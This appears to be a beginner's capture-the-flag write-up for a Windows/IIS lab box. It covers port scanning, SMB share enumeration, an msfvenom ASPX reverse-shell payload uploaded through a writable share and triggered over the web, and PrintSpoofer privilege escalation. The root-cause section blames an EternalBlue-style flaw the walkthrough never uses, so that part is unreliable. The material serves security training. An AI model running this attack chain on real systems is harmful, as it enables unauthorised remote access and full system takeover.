Title: [Relevant](https://tryhackme.com/room/relevant)  
Category: [Windows/Web...]    
Difficulty: [ Medium ]  

(This write up is for absolute begginers for understand easily)

---

##  Challenge Description
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

**Scope of Work**

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt  
    

Additionally, the client has provided the following scope allowances:

- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first  
    
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

FInd:
```
User.txt
```

```
Root.txt
```

---
## Enumeration / Initial Analysis

```

nmap -p- --min-rate 10000 10.201.26.218                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 19:18 IST
Nmap scan report for 10.201.26.218
Host is up (0.36s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown

```


```
nmap -p 80,135,139,445,3389,49663,49666,49667 -Pn -sC -sV 10.201.26.218
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 19:19 IST
Nmap scan report for 10.201.26.218
Host is up (0.27s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-30T13:50:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2025-10-29T13:46:18
|_Not valid after:  2026-04-30T13:46:18
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-10-30T13:50:14+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-30T06:50:14-07:00
| smb2-time: 
|   date: 2025-10-30T13:50:13
|_  start_date: 2025-10-30T13:46:19
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required


```

Noticable port :
```
port 80
port 49663
```

Both are webserver

Lets check those

##### "IP"/

![[Pasted image 20251030221942.png]]




i run gobuster on this but got nothing


now lets check this
###### IP:49663/
![[Pasted image 20251030222022.png]]

i run gobuster on this 
```
 gobuster dir -u http://relevent.thm:49663/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

It take a few minutes and i got 
```
/nt4wrksv
```

then i run
```
relevent.thm:49663/nt4wrksv

```

But i didnt got anything

Then i goto check the SMB share
```
smbclient  -L \\\\10.201.26.218\\ 
 ```
 
 ```
 Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      

 ```
 
I notice something familiar  from the list
```
 nt4wrksv
```

i goto that sharename 
``

![[smblist.jpeg]]
i got something special 
```
passwords.txt
```



```
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123
```

```
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$                                                                                  
```
i try to use these credential to login 

but that didnt worked 

its a trap

The credentials are not the real way its jst used as to distract 




Then i goto the website and  Run
```
http://relevent.thm:49663/nt4wrksv/passwords.txt
```

![[Pasted image 20251030221756.png]]

OOOooo

now i got a spark

i used a shell reverse tcp file to get reverse shell

How to get that file
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali Ip> LPORT=53 -f aspx -o reverse.aspx

```

now u got file called 
```
reverse.aspx
```

Now send that into smb share
```
smbclient  \\\\10.201.26.218\\nt4wrksv
```

then put the file into it 
```
put reverse.aspx
```

now  run a netcat listener
```
nc -nlvp 53
```

and got to the website and run this url
```
http://relevent.thm:49663/nt4wrksv/reverse.aspx
```


Boom U got a reverse shelll

![[Pasted image 20251030221826.png]]


---
#### Privilege Escalation


Using a tool called 
```
PrintSpoofer.exe
```


sending that through the smb share like we send the reverse.aspx


and run the cmd 
```
PrintSpoofer.exe -i -c cmd

```



BOOM!!!



We got Privilege now find the flags 

User.txt flag found in 
```
C:\Users\Bob\Desktop\user.txt
```
Root.txt found in
```
C:\Users\Administrator\Desktop\root.txt
```


---
### Root Cause / Explanation

- The box is fundamentally exploitable because an unpatched Windows SMB service (vulnerable to EternalBlue-style RCE) and exposed SMB shares allowed initial footholds. In this room the attacker can enumerate SMB, access a writable/shareable resource that reveals credentials or payloads, and then leverage remote code execution against the SMB service to gain a shell.
- Post-exploit, privilege escalation is enabled by excessive privileges (SeImpersonatePrivilege / service misconfiguration) which permit token impersonation techniques (e.g., PrintSpoofer style abuse) to escalate to SYSTEM. In short: (1) reachable, unpatched network service; (2) sensitive data/credentials exposed on shares; (3) overly-permissive privileges on accounts/services — together these create the full attack chain.

----

### Tools Used

[PrintSpoofer.exe](https://github.com/dievus/printspoofer)


---
### Final Thoughts

The “Relevant” CTF is an excellent hands-on example of how real-world compromises often start with a single weak configuration. It reinforces the importance of layered defense—proper patching, strict privilege management, and continuous monitoring. While the exploitation chain may seem simple, it mirrors genuine enterprise attack vectors where one overlooked setting can escalate into full domain compromise. Completing this challenge builds both practical enumeration skills and awareness of how minor oversights can lead to critical breaches in production systems.



